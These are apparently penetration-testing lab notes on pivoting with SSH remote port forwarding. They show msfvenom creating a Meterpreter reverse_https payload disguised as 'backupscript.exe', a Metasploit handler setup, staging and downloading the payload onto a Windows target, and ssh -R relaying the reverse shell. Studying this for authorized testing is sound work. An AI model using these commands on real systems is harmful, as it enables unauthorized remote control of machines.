### Remote/Reverse Port Forwarding with SSH



```
# Sometimes, we might want to forward a local service to the remote port as well. 
# Let's consider the scenario where we can RDP into the Windows host Windows A. 
# As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.
```

![PF02](./pf02.webp "Remote/Reverse Port Forwarding")

```
# We would have to find a pivot host, which is a common connection point between our attack host and the Windows server. 
# In our case, our pivot host would be the Ubuntu server since it can connect to both: our attack host and the Windows target. 
# To gain a Meterpreter shell on Windows, we will create a Meterpreter HTTPS payload using msfvenom, 
# but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (172.16.5.129). 
# We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, 
# where our Metasploit listener is running.
```

```
# Creating a Windows Payload with msfvenom

msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

```
# Configuring & Starting the multi/handler

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https

msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0

msf6 exploit(multi/handler) > set lport 8000
lport => 8000

msf6 exploit(multi/handler) > run
[*] Started HTTPS reverse handler on https://0.0.0.0:8000

# Once our payload is created and we have our listener configured & running, 
# we can copy the payload to the Ubuntu server using the scp command 
# since we already have the credentials to connect to the Ubuntu server using SSH.
```

```
# Transferring Payload to Pivot Host

scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

```
# Starting Python3 Webserver on Pivot Host

ubuntu@Webserver$ python3 -m http.server 8123
```

```
# Downloading Payload on the Windows Target
# We can download this backupscript.exe on the Windows host via a web browser or the PowerShell cmdlet Invoke-WebRequest.

PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

```
# Once we have our payload downloaded on the Windows host, we will use SSH remote port forwarding 
# to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. 

# We will use -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. 
# The -R command asks the Ubuntu server to listen on <targetIPaddress>:8080 and forward all incoming connections 
# on port 8080 to our msfconsole listener on 0.0.0.0:8000 of our attack host.


# Using SSH -R
ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

# After creating the SSH remote port forward, we can execute the payload from the Windows target. 
# If the payload is executed as intended and attempts to connect back to our listener, 
# we can see the logs from the pivot on the pivot host.
```

# Our Meterpreter session should list that our incoming connection is from a local host itself (127.0.0.1) 
# since we are receiving the connection over the local SSH socket, 
# which created an outbound connection to the Ubuntu server. 

# Issuing the netstat command can show us that the incoming connection is from the SSH service.
# The below graphical representation provides an alternative way to understand this technique.
